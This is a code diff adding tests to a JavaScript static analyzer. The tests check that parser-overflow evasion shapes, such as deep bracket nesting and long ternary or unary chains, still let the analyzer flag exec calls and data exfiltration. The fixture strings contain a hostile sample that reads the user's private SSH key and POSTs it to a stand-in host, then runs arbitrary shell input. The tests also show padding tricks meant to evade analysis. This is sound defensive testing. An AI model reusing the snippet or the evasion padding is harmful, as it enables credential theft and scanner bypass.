@@ -70,3 +70,38 @@ describe('analysis cost on non-JavaScript input', () => {
     expect(Error.stackTraceLimit).toBeGreaterThan(0); // restored
   });
 });
+
+describe('parser-overflow evasion shapes (dt13 RG1)', () => {
+  const head = 'const cp=require("child_process");\nconst fs=require("fs");\nconst k=fs.readFileSync(process.env.HOME+"/.ssh/id_rsa","utf8");\n';
+  const tail = 'fetch("https://collect.example.net/u",{method:"POST",body:k});\ncp.exec(process.argv[2]);\n';
+  const n = 600;
+  const shapes: Record<string, string> = {
+    'brackets one per line': `${head}${tail}var p=${'[\n'.repeat(n)}${']\n'.repeat(n)};\n`,
+    'nesting on the payload line': `${head.replace(/\n/g, '')}${tail.replace(/\n/g, '')}var p=${'['.repeat(n)}${']'.repeat(n)};\n`,
+    'nesting before the payload': `var p=${'['.repeat(n)}${']'.repeat(n)};\n${head}${tail}`,
+    'ternary chain': `${head}${tail}var t=${'1?'.repeat(n * 2)}1${':1'.repeat(n * 2)};\n`,
+    'nested templates': `${head}${tail}var s=${'`${'.repeat(n * 4)}1${'}`'.repeat(n * 4)};\n`,
+    'unary chain': `${head}${tail}var u=${'!'.repeat(n * 8)}1;\n`,
+  };
+  for (const [name, code] of Object.entries(shapes)) {
+    it(`keeps the findings and reports the evasion: ${name}`, async () => {
+      const { analysisEvasion } = await import('./ast-analyzer.js');
+      const flows = analyzeCode(code, `${name}.js`);
+      expect(flows.some(f => f.type === 'eval-exec'), 'exec found').toBe(true);
+      expect(flows.some(f => f.type === 'source-to-sink'), 'exfiltration found').toBe(true);
+      expect(analysisEvasion(code, `${name}.js`)).toBeGreaterThan(0);
+    });
+  }
+
+  it('reports nothing for ordinary code', async () => {
+    const { analysisEvasion } = await import('./ast-analyzer.js');
+    expect(analysisEvasion(`${head}${tail}`, 'ok.js')).toBeUndefined();
+  });
+
+  it('splits top-level statements outside strings, templates and brackets', async () => {
+    const { topLevelSegments } = await import('./js-parse.js');
+    const code = 'a("x;y");\nb(`${c;}` ,[1;2]);\nd()';
+    expect(topLevelSegments(code).map(s => code.slice(s.start, s.end).trim()).filter(Boolean))
+      .toEqual(['a("x;y");', 'b(`${c;}` ,[1;2]);', 'd()']);
+  });
+});
